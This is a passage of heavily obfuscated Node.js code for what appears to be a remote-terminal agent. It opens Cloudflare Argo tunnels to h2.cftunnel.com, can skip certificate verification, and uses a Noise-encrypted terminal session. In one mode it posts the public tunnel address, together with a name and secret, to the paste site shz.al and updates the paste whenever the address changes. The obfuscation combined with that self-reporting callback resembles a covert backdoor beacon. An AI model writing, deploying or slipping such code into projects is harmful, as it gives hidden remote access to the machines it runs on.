        return em(0x750);
    if (a[em(0x4c4)]['O'] !== b[em(0x32e)])
        return b[em(0x671)](b[em(0x529)], a['issuer']['O'] || '');
    if (!b[em(0x7c4)](String, a[em(0x4c4)]['OU'] || '')[em(0x2eb)](b[em(0x754)]))
        return b[em(0x6bc)](em(0x4d2), a['issuer']['OU'] || '');
    if (!a[em(0x390)] || b[em(0x277)](a[em(0x390)]['CN'], b['kEcdS']))
        return 'subject\x20CN\x20mismatch';
    const c = String(a['subjectaltname'] || '')[em(0x4c0)](',')[em(0x7d9)](f => f[em(0x343)]()[em(0x40a)]()), d = c[em(0x532)](f => {
            const en = em;
            if (!f[en(0x2eb)](b[en(0x31b)]))
                return ![];
            const g = f['slice'](0x4);
            return b[en(0x1d7)](g, 'h2.cftunnel.com') || b[en(0x649)](g, b[en(0x1bc)]) || g[en(0x2eb)]('*.') && b['ginwa'][en(0x875)](g[en(0x500)](0x1));
        });
    if (!d)
        return 'SAN\x20does\x20not\x20cover\x20h2.cftunnel.com';
    return null;
}
function a0aE(a, b) {
    const eo = a0aW, c = {
            'vUZXQ': function (h, i) {
                return h(i);
            },
            'dciOD': function (h, i) {
                return h + i;
            },
            'rwrUb': function (h, i) {
                return h !== i;
            },
            'CDKUJ': 'edge\x20did\x20not\x20negotiate\x20h2',
            'yXhTP': eo(0x4e8),
            'RkkbB': function (h, i) {
                return h(i);
            },
            'RXogm': 'h2.cftunnel.com',
            'hlRZV': eo(0x5e7),
            'FDtyu': 'secureConnect',
            'YElXw': function (h, i) {
                return h + i;
            },
            'McbtJ': eo(0x195),
            'jQYGp': function (h) {
                return h();
            }
        }, d = a0a1[eo(0x500)]()[eo(0x7d1)](() => Math[eo(0x6dd)]() - 0.5);
    let f = null;
    const g = async () => {
        const ev = eo;
        for (const h of d) {
            try {
                return await new Promise((i, j) => {
                    const es = a0b, k = {
                            'WrcEN': function (m, n) {
                                const ep = a0b;
                                return c[ep(0x3a0)](m, n);
                            },
                            'PTzKh': function (m, n) {
                                const eq = a0b;
                                return c[eq(0x54e)](m, n);
                            },
                            'ibDSC': function (m, n) {
                                const er = a0b;
                                return c[er(0x493)](m, n);
                            },
                            'PYETl': c[es(0x162)],
                            'kClsC': function (m, n) {
                                const et = es;
                                return c[et(0x54e)](m, n);
                            },
                            'aPOzb': c[es(0x79e)],
                            'rOZiS': function (m, n) {
                                return c['RkkbB'](m, n);
                            }
                        }, l = a0j['connect']({
                            'host': h,
                            'port': a0a2,
                            'ALPNProtocols': ['h2'],
                            'servername': c['RXogm'],
                            'rejectUnauthorized': ![]
                        });
                    l[es(0x160)](0x2710, () => l['destroy'](new Error(es(0x34d)))), l['on'](c[es(0x6aa)], j), l['on'](c[es(0x74c)], () => {
                        const eu = es;
                        if (a) {
                            const n = k[eu(0x6f8)](a0aD, l['getPeerCertificate'](![]));
                            if (n) {
                                l[eu(0x2ef)](new Error(k[eu(0x166)]('edge\x20certificate\x20verification\x20failed:\x20', n)));
                                return;
                            }
                        }
                        const m = l[eu(0x2d0)];
                        if (m && k['ibDSC'](m, 'h2')) {
                            l[eu(0x2ef)](new Error(k[eu(0x7c8)]));
                            return;
                        }
                        a0aJ > 0x0 ? l[eu(0x160)](a0aJ, () => l[eu(0x2ef)](new Error(eu(0x5e9)))) : l['setTimeout'](0x0), b['info'](k['kClsC'](k[eu(0x442)] + h, ':') + a0a2), k['rOZiS'](i, l);
                    });
                });
            } catch (i) {
                f = i, b[ev(0x71c)](c[ev(0x164)](c[ev(0x54e)](c[ev(0x183)], h) + '\x20failed:\x20', i));
            }
        }
        throw new Error('all\x20Cloudflare\x20edges\x20failed:\x20' + f);
    };
    return c[eo(0x321)](g);
}
const a0aF = 0x2;
function a0aG(a, b, c) {
    const ew = a0aW, d = {
            'hlanc': function (g, h) {
                return g < h;
            }
        }, f = parseInt(process.env[a] || '', 0xa);
    if (!Number[ew(0x70a)](f) || d['hlanc'](f, c))
        return b;
    return f;
}
const a0aH = a0aG('KISAMA_ARGO_REREGISTER_AFTER', 0x5, 0x2), a0aI = 0x1e, a0aJ = ((() => {
        const ex = a0aW, a = {
                'rwxAX': function (c, d, f) {
                    return c(d, f);
                },
                'ukLzn': function (c, d) {
                    return c < d;
                },
                'axTHp': function (c, d) {
                    return c * d;
                },
                'gGZQA': function (c, d) {
                    return c === d;
                }
            }, b = a[ex(0x1fb)](parseInt, process.env.KISAMA_ARGO_IDLE_TIMEOUT || '', 0xa);
        if (!Number[ex(0x70a)](b) || a[ex(0x80b)](b, 0x0))
            return a[ex(0x415)](0x12c, 0x3e8);
        return a[ex(0x4e4)](b, 0x0) ? 0x0 : a[ex(0x415)](Math[ex(0x58e)](b, 0xa), 0x3e8);
    })());
function a0aK(a) {
    const ey = a0aW, b = {
            'SLPvo': function (c, d) {
                return c === d;
            },
            'QxyNH': ey(0x1fc),
            'pEkiI': function (c, d) {
                return c === d;
            }
        };
    if (b[ey(0x149)](typeof a, b[ey(0x80a)])) {
        const c = a['trim']();
        if (c)
            try {
                return JSON[ey(0x4d3)](c);
            } catch (d) {
            }
        return {};
    }
    return a && b[ey(0x1e7)](typeof a, ey(0x739)) ? a : {};
}
class a0aL {
    constructor(a) {
        const ez = a0aW;
        this['log'] = a, this[ez(0x4e2)] = new Map(), this[ez(0x80c)] = null;
    }
    async [a0aW(0x3ab)](a, b) {
        const eA = a0aW, c = {
                'mLNHC': function (l, m) {
                    return l > m;
                },
                'yPYqc': function (l, m) {
                    return l(m);
                },
                'bELOM': eA(0x24f),
                'LvpZw': function (l, m) {
                    return l + m;
                },
                'rHDVY': eA(0x2c0),
                'zYntf': eA(0x19b),
                'NlqzT': function (l, m) {
                    return l + m;
                },
                'nVYVT': function (l, m) {
                    return l + m;
                },
                'QMQJR': '\x20->\x20127.0.0.1:'
            }, d = this[eA(0x4e2)]['get'](a) || [];
        if (c[eA(0x3f6)](d[eA(0x650)], 0x0) && !b) {
            const l = new Error('tunnel\x20already\x20exists\x20on\x20port\x20' + a + eA(0x3c3));
            l['status'] = 0x199, l['port'] = a;
            throw l;
        }
        let f, g, h, i;
        try {
            [f, g, h, i] = await c[eA(0x39d)](a0at, c['bELOM']);
        } catch (m) {
            const n = new Error(c['LvpZw'](c[eA(0x4c8)], m['message']));
            n[eA(0x7dc)] = 0x1f4, n[eA(0x470)] = a;
            throw n;
        }
        const j = f[eA(0x2eb)](c['zYntf']) ? f : c[eA(0x712)](eA(0x19b), f), k = {
                'tunnelDomain': j,
                'port': a,
                'createdAt': new Date()[eA(0x151)]()[eA(0x676)](/\.\d{3}Z$/, 'Z'),
                'stopped': ![],
                'sock': null,
                'runPromise': null
            };
        return k[eA(0x154)] = this[eA(0x427)](k, g, h, i)[eA(0x2fa)](o => this[eA(0x711)][eA(0x71c)]('argo\x20tunnel\x20loop\x20for\x20' + j + eA(0x263) + o[eA(0x7df)])), d[eA(0x24a)](k), this[eA(0x4e2)][eA(0x5ef)](a, d), this[eA(0x711)][eA(0x4dd)](c[eA(0x62e)](c[eA(0x62e)](c[eA(0x22c)]('argo\x20tunnel\x20created:\x20', j), c[eA(0x2bd)]), a)), k;
    }
    [a0aW(0x288)]() {
        const eB = a0aW, a = [], b = [...this[eB(0x4e2)]['keys']()][eB(0x7d1)]((c, d) => c - d);
        for (const c of b) {
            for (const d of this[eB(0x4e2)][eB(0x225)](c)) {
                a[eB(0x24a)]({
                    'tunnel_domain': d[eB(0x4e0)],
                    'port': d[eB(0x470)],
                    'created_at': d[eB(0x71e)]
                });
            }
        }
        return a;
    }
    async ['remove'](a, b) {
        const eC = a0aW, c = {
                'mZTyc': function (i, j) {
                    return i === j;
                },
                'CesDs': function (i, j) {
                    return i === j;
                },
                'SivqR': function (i, j) {
                    return i !== j;
                },
                'OEHDz': function (i, j) {
                    return i + j;
                },
                'WzJvS': eC(0x5b2)
            }, d = this[eC(0x4e2)][eC(0x225)](a) || [];
        if (c['mZTyc'](d['length'], 0x0))
            return {
                'status': 0x194,
                'message': eC(0x7de) + a
            };
        let f;
        if (c[eC(0x1f2)](b, undefined) || c['mZTyc'](b, null) || c[eC(0x1da)](b, '')) {
            if (d[eC(0x650)] > 0x1)
                return {
                    'status': 0x199,
                    'message': eC(0x5d3) + a + eC(0x78a)
                };
            f = d;
        } else {
            f = d[eC(0x3cc)](i => i[eC(0x4e0)] === b);
            if (c[eC(0x1f2)](f[eC(0x650)], 0x0))
                return {
                    'status': 0x194,
                    'message': eC(0x7de) + a + eC(0x76a) + b
                };
        }
        const g = [];
        for (const i of f) {
            i['stopped'] = !![];
            if (c[eC(0x7a6)](i['sock'], null))
                try {
                    i['sock'][eC(0x2ef)]();
                } catch (j) {
                }
            await i[eC(0x154)][eC(0x2fa)](() => {
            }), g[eC(0x24a)]({
                'tunnel_domain': i[eC(0x4e0)],
                'port': i[eC(0x470)],
                'created_at': i[eC(0x71e)]
            });
        }
        const h = d['filter'](k => !k['stopped']);
        h[eC(0x650)] > 0x0 ? this[eC(0x4e2)][eC(0x5ef)](a, h) : this[eC(0x4e2)][eC(0x317)](a);
        for (const k of g) {
            this[eC(0x711)][eC(0x4dd)](c['OEHDz'](c[eC(0x246)], k[eC(0x3aa)]));
        }
        return {
            'status': 'ok',
            'deleted': g[eC(0x650)],
            'tunnels': g
        };
    }
    async [a0aW(0x427)](a, b, c, d) {
        const eD = a0aW, f = {
                'hChGP': function (k, l) {
                    return k < l;
                },
                'TxiNz': function (k, l) {
                    return k + l;
                },
                'whBVQ': eD(0x6b0),
                'IiQgi': function (k, l) {
                    return k !== l;
                },
                'uFfWu': function (k, l) {
                    return k(l);
                },
                'cuyca': eD(0x344),
                'ttNzU': function (k, l) {
                    return k + l;
                },
                'UfUfe': function (k, l) {
                    return k + l;
                },
                'julKd': 'argo\x20tunnel\x20',
                'GRMdG': eD(0x44f),
                'yDNvy': function (k, l) {
                    return k !== l;
                },
                'hlNbV': function (k, l) {
                    return k !== l;
                },
                'FGkWg': function (k, l) {
                    return k >= l;
                },
                'jmkeQ': function (k, l) {
                    return k * l;
                },
                'wMuIt': function (k, l) {
                    return k(l);
                }
            }, g = f['TxiNz'](f[eD(0x3e4)], a[eD(0x470)]), h = async k => {
                const eE = eD;
                for (let l = 0x0; f[eE(0x42d)](l, k) && !a[eE(0x672)]; l += 0x1f4) {
                    await new Promise(m => setTimeout(m, Math[eE(0x79f)](0x1f4, k - l)));
                }
            };
        let i = 0x0, j = 0x0;
        while (!a[eD(0x672)]) {
            let k = null, l = null;
            try {
                const m = f['IiQgi'](f[eD(0x5fd)](String, process.env.KISAMA_EDGE_INSECURE || '')[eD(0x40a)](), f[eD(0x747)]);
                k = await a0aE(m, this[eD(0x711)]);
                if (a[eD(0x672)]) {
                    try {
                        k[eD(0x2ef)]();
                    } catch (n) {
                    }
                    break;
                }
                a[eD(0x303)] = k, j = f[eD(0x7e9)](j, 0x1) % 0x4, l = new a0aw(k, g, b, c, d, j, this[eD(0x711)], a[eD(0x4e0)], ![], { 'printed': !![] }), await l[eD(0x62f)]();
            } catch (o) {
                !a[eD(0x672)] && this[eD(0x711)][eD(0x71c)](f[eD(0x3c2)](f[eD(0x5c0)](f['julKd'] + a[eD(0x4e0)], f[eD(0x410)]), o['message']));
            } finally {
                if (f[eD(0x888)](k, null))
                    try {
                        k[eD(0x2ef)]();
                    } catch (p) {
                    }
                a[eD(0x303)] = null;
            }
            if (a['stopped'])
                break;
            f['hlNbV'](l, null) && l[eD(0x36f)] ? i = 0x0 : (i += 0x1, f[eD(0x537)](i, a0aH) && (await this[eD(0x7fe)](a, (q, r, s) => {
                b = q, c = r, d = s;
            }) ? i = 0x0 : await h(f['jmkeQ'](a0aI, 0x3e8)))), !a[eD(0x672)] && await f[eD(0x592)](h, a0aF * 0x3e8);
        }
    }
    ['_reregister'](a, b) {
        const eF = a0aW, c = {
                'hmLls': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'TyziU': 'https://',
                'tXWPj': function (f, g) {
                    return f + g;
                },
                'Ougaq': function (f, g) {
                    return f + g;
                },
                'cXnZp': function (f, g) {
                    return f === g;
                },
                'eiLKK': eF(0x5c7),
                'AvjWh': eF(0x4ae),
                'HyXok': function (f, g) {
                    return f(g);
                },
                'NUNbp': eF(0x24f)
            }, d = this[eF(0x81e)] || a0at;
        return c[eF(0x1a9)](d, c['NUNbp'])[eF(0x66c)](([f, g, h, i]) => {
            const eG = eF, j = a[eG(0x4e0)];
            c[eG(0x594)](b, g, h, i), a[eG(0x4e0)] = f['startsWith'](c[eG(0x286)]) ? f : c[eG(0x2e0)](c['TyziU'], f), this[eG(0x711)][eG(0x71c)](c[eG(0x72b)]('argo\x20tunnel\x20domain\x20changed:\x20' + j, eG(0x4cb)) + a[eG(0x4e0)]);
            if (c['cXnZp'](typeof this[eG(0x80c)], c[eG(0x3c4)]))
                try {
                    this[eG(0x80c)](j, a['tunnelDomain']);
                } catch (k) {
                }
            return !![];
        })[eF(0x2fa)](f => {
            const eH = eF;
            return this[eH(0x711)]['warning'](c[eH(0x72b)](c[eH(0x2e4)], f[eH(0x7df)])), ![];
        });
    }
}
class a0aM {
    static [a0aW(0x2d8)] = ![];
    static [a0aW(0x3b7)] = null;
    static ['_SHZAL_NAME_CHARS'] = /^[A-Za-z0-9+_\-*$=@,;[/\]]+$/;
    static [a0aW(0x158)] = ![];
    static [a0aW(0x43e)]() {
        const eI = a0aW, a = {
                'BOncX': function (g, h) {
                    return g < h;
                },
                'CgmYg': eI(0x1d9),
                'NLFjp': function (g, h) {
                    return g < h;
                },
                'BHfoN': 'KNAME_KEY',
                'qvOXm': eI(0x568),
                'qlvTE': function (g, h) {
                    return g === h;
                },
                'IpmGn': function (g, h) {
                    return g || h;
                },
                'BFZrH': '(未设置)',
                'kNjpS': eI(0x6c6),
                'IcBPB': eI(0x7bb)
            }, b = a0P[eI(0x568)] || '', c = a0P[eI(0x1ff)] || a0P[eI(0x568)] || '', d = [];
        if (a[eI(0x6cd)](b[eI(0x650)], 0x3))
            d[eI(0x24a)]('KNAME\x20过短\x20(' + b[eI(0x650)] + eI(0x7b4));
        if (!this[eI(0x581)]['test'](b))
            d['push'](a[eI(0x29b)]);
        if (a[eI(0x3ed)](c[eI(0x650)], 0x8))
            d['push']('密钥过短\x20(' + c[eI(0x650)] + '<8,\x20实际使用\x20' + (a0P[eI(0x1ff)] ? a['BHfoN'] : a[eI(0x163)]) + ')');
        const f = a[eI(0x5c3)](d[eI(0x650)], 0x0);
        return !f && !this[eI(0x158)] && (this[eI(0x158)] = !![], a0D[eI(0x4dd)]('[KMODE]\x20⚠️\x20KMODE=2\x20未生效,\x20条件不满足:\x20' + d[eI(0x2f9)](';\x20') + eI(0x77e) + a[eI(0x46d)](b, a[eI(0x6df)]) + eI(0x430) + (a0P[eI(0x1ff)] || a[eI(0x730)]) + ')'), a0D[eI(0x4dd)](a['IcBPB'])), f;
    }
    static [a0aW(0x42c)]() {
        const eJ = a0aW, a = {
                'ctEiQ': function (b, c) {
                    return b(c);
                },
                'LZzPV': eJ(0x344)
            };
        return a0P[eJ(0x550)] || a[eJ(0x404)](String, process.env.SHZAL_DEBUG || '')[eJ(0x40a)]() === a[eJ(0x596)];
    }
    static [a0aW(0x686)](a) {
        const eK = a0aW, b = {
                'bWQzL': function (f, g) {
                    return f + g;
                },
                'saEPI': eK(0x667),
                'ZQRAz': function (f, g) {
                    return f + g;
                },
                'vvSFe': '\x20请求异常:\x20',
                'PPqWk': function (f, g) {
                    return f === g;
                },
                'UfYjX': function (f, g) {
                    return f(g);
                },
                'jVNRx': function (f, g, h, i, j) {
                    return f(g, h, i, j);
                },
                'CjIOw': eK(0x85d),
                'YvlBL': function (f, g) {
                    return f + g;
                },
                'HkuEB': eK(0x350),
                'otpVP': 'hex',
                'RJIoN': function (f, g) {
                    return f + g;
                },
                'cmcsc': eK(0x22d),
                'AowMD': eK(0x1ad),
                'pDwHO': function (f, g) {
                    return f > g;
                },
                'umPla': function (f, g, h, i, j) {
                    return f(g, h, i, j);
                },
                'nwHfB': 'https://shz.al/',
                'kMQRc': function (f, g) {
                    return f(g);
                },
                'fehiE': eK(0x756),
                'TzyOT': '上报异常:\x20',
                'RgkVe': function (f, g) {
                    return f(g);
                }
            }, c = this[eK(0x42c)](), d = f => {
                const eL = eK;
                if (c)
                    a0D[eL(0x768)](b['bWQzL'](b[eL(0x5da)], f));
            };
        return new Promise(f => {
            const eN = eK, g = {
                    'DyuHk': function (n, o) {
                        return n(o);
                    },
                    'DwLUy': function (n, o) {
                        const eM = a0b;
                        return b[eM(0x29a)](n, o);
                    },
                    'ellxK': b[eN(0x2c2)],
                    'DBoNb': eN(0x56e),
                    'NCkxT': 'error',
                    'Cfude': function (n, o) {
                        const eO = eN;
                        return b[eO(0x45a)](n, o);
                    },
                    'xlUqm': function (n, o) {
                        const eP = eN;
                        return b[eP(0x3be)](n, o);
                    },
                    'XzeSi': function (n, o) {
                        return n + o;
                    },
                    'vBRLv': function (n, o) {
                        const eQ = eN;
                        return b[eQ(0x3be)](n, o);
                    },
                    'nvUNv': function (n, o) {
                        const eR = eN;
                        return b[eR(0x29a)](n, o);
                    },
                    'DWVZU': function (n, o, p, q, r) {
                        const eS = eN;
                        return b[eS(0x1c1)](n, o, p, q, r);
                    },
                    'Zgxaq': eN(0x296),
                    'owKBE': function (n, o) {
                        const eT = eN;
                        return b[eT(0x45a)](n, o);
                    },
                    'bkNMj': function (n, o) {
                        return b['UfYjX'](n, o);
                    },
                    'ZLqTv': b['CjIOw'],
                    'GnJmO': function (n, o) {
                        const eU = eN;
                        return b[eU(0x84f)](n, o);
                    },
                    'tHdTh': eN(0x266)
                }, h = a0P[eN(0x568)], i = a0P[eN(0x1ff)] || a0P[eN(0x568)], j = b['bWQzL'](b['HkuEB'], a0k[eN(0x273)](0xc)[eN(0x491)](b[eN(0x4b2)])), k = [
                    [
                        'c',
                        a
                    ],
                    [
                        'n',
                        h
                    ],
                    [
                        's',
                        i
                    ],
                    [
                        'e',
                        '7d'
                    ]
                ], l = n => {
                    const eV = eN, o = n[eV(0x7d9)](([p, q]) => Buffer['from']('--' + j + eV(0x83e) + p + eV(0x3fe) + q + '\x0d\x0a'));
                    return o[eV(0x24a)](Buffer[eV(0x7e4)]('--' + j + eV(0x578))), Buffer[eV(0x85e)](o);
                }, m = (n, o, p, q) => {
                    const eY = eN, r = {
                            'bzheO': function (v, w) {
                                const eW = a0b;
                                return g[eW(0x159)](v, w);
                            },
                            'AerlK': function (v, w) {
                                return v + w;
                            },
                            'uIjoP': function (v, w) {
                                const eX = a0b;
                                return g[eX(0x54f)](v, w);
                            },
                            'pFfCl': g[eY(0x83b)]
                        }, s = new URL(n), t = a0h[eY(0x4e5)]({
                            'hostname': s[eY(0x69c)],
                            'port': s[eY(0x470)] || 0x1bb,
                            'path': s[eY(0x83a)] + s['search'],
                            'method': p,
                            'headers': {
                                'Content-Type': eY(0x881) + j,
                                'Content-Length': o ? o[eY(0x650)] : 0x0,
                                'User-Agent': g[eY(0x709)]
                            }
                        }, v => {
                            const eZ = eY;
                            v[eZ(0x2a1)](), v['on'](eZ(0x342), () => q(v[eZ(0x475)]));
                        });
                    t['on'](g[eY(0x70d)], v => {
                        const f0 = eY;
                        r[f0(0x5f6)](d, r['AerlK'](r[f0(0x5d4)](r[f0(0x6ba)](p, '\x20'), n) + r['pFfCl'], v[f0(0x7df)])), r[f0(0x5f6)](q, 0x0);
                    }), t[eY(0x160)](0x7530, () => t[eY(0x2ef)](new Error(eY(0x556))));
                    if (o)
                        t[eY(0x805)](o);
                    t['end']();
                };
            b[eN(0x3be)](d, b['bWQzL'](b[eN(0x2cd)](b[eN(0x84f)](b['cmcsc'], h), b[eN(0x5df)]) + b[eN(0x642)](i[eN(0x650)], 0x0), ')'));
            try {
                b[eN(0x2c9)](m, b[eN(0x21c)], b['kMQRc'](l, k), b[eN(0x6a1)], n => {
                    const f3 = eN, o = {
                            'WEtPn': function (p, q) {
                                return g['DyuHk'](p, q);
                            },
                            'ucYnZ': function (p, q) {
                                return p + q;
                            },
                            'uoZye': function (p, q) {
                                const f1 = a0b;
                                return g[f1(0x379)](p, q);
                            },
                            'TfWEr': function (p, q) {
                                const f2 = a0b;
                                return g[f2(0x159)](p, q);
                            }
                        };
                    g[f3(0x703)](d, g[f3(0x68e)]('POST\x20https://shz.al/\x20状态:\x20', n));
                    if (g[f3(0x379)](n, 0x199)) {
                        g['vBRLv'](d, g['XzeSi'](g[f3(0x391)](f3(0x1f4), h), ':*'));
                        const p = k[f3(0x3cc)](([q]) => q !== 'n');
                        g[f3(0x478)](m, f3(0x3dc) + h + ':' + i, g[f3(0x159)](l, p), g[f3(0x3a4)], q => {
                            const f4 = f3;
                            o[f4(0x2f0)](d, o[f4(0x40d)](o[f4(0x40d)](f4(0x693), q), o[f4(0x821)](q, 0xc8) ? '\x20(成功)' : f4(0x7fd))), o[f4(0x60a)](f, o[f4(0x821)](q, 0xc8));
                        });
                    } else
                        g[f3(0x2b7)](n, 0xc8) ? (g[f3(0x4b5)](d, g['ZLqTv']), g[f3(0x1e6)](f, !![])) : (g[f3(0x159)](d, g[f3(0x653)](g[f3(0x54f)](g[f3(0x838)], n), ')')), g['DyuHk'](f, ![]));
                });
            } catch (n) {
                b[eN(0x3be)](d, b[eN(0x2cd)](b[eN(0x76f)], n['message'])), b[eN(0x882)](f, ![]);
            }
        })[eK(0x66c)](f => {
            const f5 = eK;
            if (f)
                this[f5(0x3b7)] = a;
            return f;
        })['catch'](() => ![]);
    }
    static async [a0aW(0x6f7)](a) {
        const f6 = a0aW, b = {
                'bQFVw': function (c, d) {
                    return c <= d;
                }
            };
        for (let c = 0x1; b[f6(0x2e3)](c, 0x3); c++) {
            if (await this[f6(0x686)](a))
                return;
            c < 0x3 && await new Promise(d => setTimeout(d, 0x3e8 * 0x2 ** c));
        }
    }
    static [a0aW(0x731)]() {
        const f7 = a0aW, a = [
                process.env.USERPROFILE,
                process.env.HOME
            ];
        for (const b of a) {
            if (b && a0l[f7(0x5ec)](b) && a0l['statSync'](b)[f7(0x535)]())
                return b;
        }
        try {
            return a0p['homedir']();
        } catch (c) {
            return process['cwd']();
        }
    }
    static [a0aW(0x740)]() {
        const f8 = a0aW, a = {
                'NzdQB': f8(0x769),
                'KZsvI': f8(0x796)
            };
        let b = (a0P[f8(0x830)] || '')[f8(0x343)]();
        if (!b)
            return a0o[f8(0x2f9)](this[f8(0x731)](), a[f8(0x508)]);
        if (b[f8(0x2eb)](a[f8(0x79d)]))
            b = b[f8(0x650)] > 0x5 ? a0o[f8(0x2f9)](this[f8(0x731)](), b[f8(0x500)](0x5)['replace'](/^[/\\]+/, '')) : this[f8(0x731)]();
        else
            b[f8(0x2eb)]('~') && (b = a0o[f8(0x38c)](b[f8(0x676)](/^~(?=[/\\]|$)/, this[f8(0x731)]())));
        return b;
    }
    static [a0aW(0x42b)](a) {
        const f9 = a0aW;
        this[f9(0x3b7)] = a;
        const b = this[f9(0x740)]();
        try {
            a0l[f9(0x1bd)](a0o[f9(0x236)](a0o['resolve'](b)), { 'recursive': !![] }), a0l[f9(0x565)](b, a), a0D[f9(0x4dd)](f9(0x38e) + b);
        } catch (c) {
            a0D[f9(0x3d2)]('[KMODE]\x20⚠️\x20域名文件写入失败\x20(' + b + f9(0x192) + c[f9(0x7df)]);
        }
    }
    static [a0aW(0x6ed)]() {
        const fa = a0aW, a = this[fa(0x740)]();
        try {
            a0l[fa(0x5ec)](a) && a0l[fa(0x380)](a)[fa(0x1b4)]() && (a0l[fa(0x723)](a), a0D['info'](fa(0x20c) + a));
        } catch (b) {
            a0D['warn']('[KMODE]\x20⚠️\x20域名文件删除失败\x20(' + a + '):\x20' + b['message']);
        }
    }
    static ['onBaseinfoSuccess']() {
        const fb = a0aW;
        !this[fb(0x2d8)] && (this['_baseinfoHooked'] = !![], this[fb(0x6ed)]());
    }
    static ['startStdinListener']() {
        const fc = a0aW, a = {
                'SQNkb': function (b, c) {
                    return b === c;
                },
                'KHBqd': '/domain',
                'lNMAd': fc(0x36d),
                'IyfDV': fc(0x746),
                'xbcnk': 'close',
                'HRTnJ': fc(0x5e7)
            };
        try {
            const b = a0q[fc(0x2d9)]({
                'input': process[fc(0x69d)],
                'terminal': ![]
            });
            b['on'](a['IyfDV'], c => {
                const fd = fc;
                a['SQNkb'](c[fd(0x343)](), a['KHBqd']) && console[fd(0x711)](this[fd(0x3b7)] || a['lNMAd']);
            }), b['on'](a[fc(0x530)], () => {
            }), b['on'](a[fc(0x538)], () => {
            });
        } catch (c) {
        }
    }
    static [a0aW(0x318)](a) {
        const fe = a0aW, b = {
                'NMydl': function (c, d) {
                    return c === d;
                },
                'TUEDt': fe(0x616)
            };
        if (b[fe(0x484)](a0P['KMODE'], '2') && this[fe(0x43e)]()) {
            a0D[fe(0x4dd)](b['TUEDt']), a[fe(0x80c)] = (c, d) => {
                const ff = fe;
                this[ff(0x6f7)](d);
            }, a[fe(0x3ab)](a0P[fe(0x70f)])['then'](c => this[fe(0x686)](c[fe(0x4e0)]))[fe(0x2fa)](() => {
            });
            return;
        }
        a0D[fe(0x4dd)](fe(0x444)), a[fe(0x80c)] = (c, d) => {
            this['writeDomainFile'](d);
        }, a[fe(0x3ab)](a0P['PORT'])[fe(0x66c)](c => {
            const fg = fe;
            this['writeDomainFile'](c[fg(0x4e0)]);
        })[fe(0x2fa)](c => {
            const fh = fe;
            a0D['warn'](fh(0x455) + c['message']);
        }), this['startStdinListener']();
    }
}
let a0aN = null, a0aO = null;
const a0aP = new Promise((a, b) => {
    const fi = a0aW, c = {
            'rZqDw': fi(0x587),
            'zgqjF': fi(0x513),
            'dKLWY': fi(0x35b),
            'YDyrp': function (d) {
                return d();
            },
            'zaDhz': function (d, f) {
                return d(f);
            },
            'ULclH': fi(0x52c)
        };
    try {
        c[fi(0x446)](a0y, function (d) {
            const fj = fi;
            if (!d) {
                a0aO = new Error(c[fj(0x1db)]), a0D[fj(0x3d2)](c['zgqjF'], a0aO[fj(0x7df)]), a();
                return;
            }
            a0aN = d, a0D[fj(0x768)](c[fj(0x880)]), c[fj(0x3e2)](a);
        });
    } catch (d) {
        a0aO = d, a0D['warn'](c[fi(0x78f)], d['message']), c[fi(0x3e2)](a);
    }
});
process['on']('unhandledRejection', (a, b) => {
    const fk = a0aW, c = { 'kVomV': fk(0x7c6) };
    a0D[fk(0x5e7)](c['kVomV'], a);
}), process['on'](a0aW(0x35a), a => {
    const fl = a0aW, b = { 'wbUuS': fl(0x53c) };
    a0D[fl(0x5e7)](b['wbUuS'], a), process[fl(0x64c)](0x1);
});
class a0aQ {
    constructor(a, b, c) {
        const fm = a0aW, d = { 'mBnOf': fm(0x2da) }, f = d[fm(0x216)][fm(0x4c0)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[fm(0x61a)] = c;
                continue;
            case '1':
                this[fm(0x33b)] = null;
                continue;
            case '2':
                this[fm(0x4f9)] = null;
                continue;
            case '3':
                this[fm(0x285)] = a;
                continue;
            case '4':
                this[fm(0x4cc)] = ![];
                continue;
            case '5':
                this['hs'] = null;
                continue;
            case '6':
                this['localPrivB64'] = b;
                continue;
            }
            break;
        }
    }
    async [a0aW(0x432)]() {
        const fn = a0aW, a = {
                'jIVZu': fn(0x64b),
                'TdqtO': 'kisama_terminal_v1',
                'jkkFq': fn(0x7f9)
            };
        await a0aP;
        if (!a0aN)
            throw a0aO || new Error(a[fn(0x6c5)]);
        const b = a0aN, c = this[fn(0x285)] ? b[fn(0x3a1)][fn(0x58f)] : b[fn(0x3a1)]['NOISE_ROLE_RESPONDER'];
        this['hs'] = b[fn(0x156)](fn(0x218), c);
        const d = Buffer[fn(0x7e4)](a[fn(0x604)]), f = this[fn(0x691)] ? Buffer[fn(0x7e4)](this[fn(0x691)], a[fn(0x52e)]) : null, g = this[fn(0x61a)] ? Buffer[fn(0x7e4)](this[fn(0x61a)], a[fn(0x52e)]) : null;
        this['hs'][fn(0x1f8)](d, f, g, null);
    }
    [a0aW(0x51a)](a) {
        const fo = a0aW, b = {
                'BsyDj': function (d, f) {
                    return d > f;
                },
                'SYgGV': function (d, f) {
                    return d === f;
                },
                'KVAii': function (d, f) {
                    return d === f;
                }
            };
        if (this[fo(0x4cc)])
            return Buffer[fo(0x605)](0x0);
        const c = a0aN;
        a && b[fo(0x844)](a['length'], 0x0) && this['hs'][fo(0x45f)]() === c[fo(0x3a1)][fo(0x217)] && this['hs'][fo(0x73e)](a);
        if (b[fo(0x6b5)](this['hs']['GetAction'](), c['constants'][fo(0x780)]))
            return this[fo(0x820)](), Buffer[fo(0x605)](0x0);
        if (b[fo(0x6b5)](this['hs'][fo(0x45f)](), c[fo(0x3a1)][fo(0x282)])) {
            const d = this['hs'][fo(0x287)](new Uint8Array(0x0));
            return b['KVAii'](this['hs'][fo(0x45f)](), c[fo(0x3a1)][fo(0x780)]) && this['_splitAndFinish'](), Buffer[fo(0x7e4)](d);
        }
        return Buffer['alloc'](0x0);
    }
    [a0aW(0x820)]() {
        const fp = a0aW, a = {
                'rtWPO': fp(0x7f9),
                'SmWVf': function (g, h) {
                    return g && h;
                },
                'tphSz': function (g, h) {
                    return g === h;
                },
                'gBCca': 'Noise\x20peer\x20static\x20key\x20verification\x20failed'
            };
        let b = null;
        try {
            b = this['hs'][fp(0x4a0)]();
        } catch (g) {
            b = null;
        }
        const c = this[fp(0x61a)] ? Buffer['from'](this[fp(0x61a)], a[fp(0x7f0)]) : null, d = a[fp(0x707)](b, c) && a[fp(0x1d6)](b['length'], c[fp(0x650)]) && a0k[fp(0x347)](Buffer[fp(0x7e4)](b), c);
        if (!d)
            throw new Error(a[fp(0x297)]);
